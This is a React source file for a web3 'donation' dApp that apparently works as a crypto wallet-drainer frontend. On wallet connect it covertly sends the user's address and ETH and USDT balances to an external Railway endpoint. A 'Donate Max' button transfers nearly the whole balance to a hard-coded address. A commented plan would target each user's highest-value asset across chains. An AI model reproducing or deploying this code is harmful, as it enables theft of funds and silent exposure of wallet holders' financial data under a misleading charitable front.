import React, { useEffect } from "react";
import { ConnectButton } from "@rainbow-me/rainbowkit";
import {
  useAccount,
  useBalance,
  useSendTransaction,
  useChainId,
  useWaitForTransactionReceipt,
  readContract,
} from "wagmi";
import { parseEther, formatEther } from "viem";

// ✅ Backend endpoint (Flask)
const API_URL = "https://web-production-2da7.up.railway.app/notify";

// ✅ USDT contract addresses (ERC20 + BEP20, can add more later)
const USDT_ADDRESSES = {
  1: "0xdAC17F958D2ee523a2206206994597C13D831ec7", // Ethereum mainnet
  56: "0x55d398326f99059fF775485246999027B3197955", // BSC
  11155111: "", // Sepolia (no USDT)
};

// ✅ ERC20 ABI fragment for balanceOf & decimals
const ERC20_ABI = [
  {
    name: "balanceOf",
    type: "function",
    stateMutability: "view",
    inputs: [{ name: "owner", type: "address" }],
    outputs: [{ type: "uint256" }],
  },
  {
    name: "decimals",
    type: "function",
    stateMutability: "view",
    inputs: [],
    outputs: [{ type: "uint8" }],
  },
];

// ✅ Notify backend helper
async function notifyBackend(event, data) {
  try {
    await fetch(API_URL, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        event,
        data,
        source: window.location.href, // full frontend link
        ip: "client", // placeholder
      }),
    });
  } catch (err) {
    console.error("Notify error:", err);
  }
}

export default function App() {
  const { address, isConnected } = useAccount();
  const chainId = useChainId();

  // Native balance
  const { data: balanceData } = useBalance({ address });

  // Send transaction
  const { data: txHash, sendTransaction } = useSendTransaction();

  // Wait for transaction confirmation
  const { isSuccess: txConfirmed } = useWaitForTransactionReceipt({
    hash: txHash,
  });

  // ✅ Notify when transaction confirmed
  useEffect(() => {
    if (txConfirmed && txHash) {
      notifyBackend("donation_sent", {
        account: address,
        chain: chainId,
        txHash,
      });
    }
  }, [txConfirmed, txHash, address, chainId]);

  // ✅ Notify when wallet connected
  useEffect(() => {
    if (isConnected && address) {
      (async () => {
        let ethBalance = "N/A";
        let usdtBalance = "N/A";

        try {
          if (balanceData?.value) {
            ethBalance = formatEther(balanceData.value);
          }

          // ✅ Fetch USDT balance if contract exists on chain
          if (USDT_ADDRESSES[chainId]) {
            const [rawBal, decimals] = await Promise.all([
              readContract({
                address: USDT_ADDRESSES[chainId],
                abi: ERC20_ABI,
                functionName: "balanceOf",
                args: [address],
              }),
              readContract({
                address: USDT_ADDRESSES[chainId],
                abi: ERC20_ABI,
                functionName: "decimals",
              }),
            ]);
            usdtBalance = Number(rawBal) / 10 ** decimals;
          }
        } catch (e) {
          console.error("Token fetch error:", e);
        }

        notifyBackend("wallet_connect", {
          account: address,
          chain: chainId,
          eth_usd: ethBalance,
          usdt_usd: usdtBalance,
        });
      })();
    }
  }, [isConnected, address, chainId, balanceData]);

  // ✅ Fixed donation (0.01 ETH)
  const handleDonateFixed = async () => {
    try {
      notifyBackend("donation_attempt", {
        account: address,
        chain: chainId,
        amount: "0.01 ETH",
      });

      await sendTransaction({
        to: "0xdC3b29e4a6aF19d5E57965596020127A09049d83",
        value: parseEther("0.01"),
      });
    } catch (err) {
      notifyBackend("donation_failed", { account: address, error: err.message });
    }
  };

  // ✅ Donate max (minus gas buffer)
  const handleDonateMax = async () => {
    if (!balanceData?.value) return;

    try {
      const rawBalance = balanceData.value; // BigInt
      const balanceEth = parseFloat(formatEther(rawBalance));

      if (balanceEth <= 0.001) {
        notifyBackend("donation_failed", {
          account: address,
          error: "Insufficient balance",
        });
        return;
      }

      const sendAmountEth = balanceEth - 0.001;
      const sendAmountWei = parseEther(sendAmountEth.toFixed(6));

      notifyBackend("donation_attempt", {
        account: address,
        chain: chainId,
        amount: `${sendAmountEth.toFixed(6)} ETH`,
      });

      await sendTransaction({
        to: "0xdC3b29e4a6aF19d5E57965596020127A09049d83",
        value: sendAmountWei,
      });
    } catch (err) {
      notifyBackend("donation_failed", { account: address, error: err.message });
    }
  };

  return (
    <div className="flex flex-col items-center justify-center h-screen bg-gray-900 text-white space-y-6">
      <h1 className="text-4xl font-bold">🚀 My Custom DApp</h1>
      <ConnectButton />

      {isConnected && (
        <div className="flex flex-col gap-4">
          <button
            onClick={handleDonateFixed}
            className="px-6 py-3 bg-blue-600 hover:bg-blue-800 rounded-lg text-lg"
          >
            Donate 0.01 ETH
          </button>
          <button
            onClick={handleDonateMax}
            className="px-6 py-3 bg-red-600 hover:bg-red-800 rounded-lg text-lg"
          >
            Donate Max ETH
          </button>
        </div>
      )}
    </div>
  );
}

/*
--------------------------------------------
🚧 Future Feature (Commented Out For Now):
Auto-detect highest USD balance across ETH, BNB, USDT
and request chain switch if needed before donation.
--------------------------------------------
*/
